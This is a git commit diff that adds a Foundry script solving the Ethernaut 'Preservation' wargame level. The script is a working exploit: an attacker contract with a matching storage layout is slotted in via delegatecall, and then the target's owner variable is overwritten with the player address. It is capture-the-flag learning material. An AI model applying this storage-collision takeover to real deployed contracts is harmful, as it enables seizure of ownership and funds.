cf06d4a67d94fa1b3e8b705fae8a160820d2bcf2
Ho-Ya-Ho <rkdgh1056@gmail.com>
2025-07-07 19:48:23 +0900

    Preservation

--- ethernaut/16_Preservation/script/Preservation.s.sol
+++ ethernaut/16_Preservation/script/Preservation.s.sol
@@ -4,16 +4,40 @@ pragma solidity ^0.8.13;
 import {Script, console} from "forge-std/Script.sol";
 import {Preservation} from "../src/Preservation.sol";
 
+
+interface IPreservation {
+    function setFirstTime(uint256 _timestamp) external;
+    function owner() external view returns (address);
+}
+
+contract Attack {
+    address public slot0;
+    address public slot1;
+    address public owner;
+
+    function setTime(uint256 _value) public {
+        owner = address(uint160(_value));
+    }
+}
+
 contract PreservationScript is Script {
-    Preservation public counter;
+    address private constant PRESERVATION_ADDRESS = 0x0f98cd1bf3c86260EcF4ef7E3e47D59Ce8344c53;
+    address private constant PLAYER_ADDRESS = 0x8fe205351ADE3b32245FFcBa2F58141Fa3B0a20F;
 
-    function setUp() public {}
+    function run() external {
+    vm.startBroadcast();
 
-    function run() public {
-        vm.startBroadcast();
+    IPreservation target = IPreservation(PRESERVATION_ADDRESS);
 
-        counter = new Preservation();
+    Attack attack = new Attack();
+    console.log("attack address is:", address(attack));
+    console.log("Current owner is:", target.owner());
 
-        vm.stopBroadcast();
+    target.setFirstTime(uint256(uint160(address(attack))));
+    target.setFirstTime(uint256(uint160(PLAYER_ADDRESS)));
+
+    console.log("Final owner is:", target.owner());
+
+    vm.stopBroadcast();
     }
 }
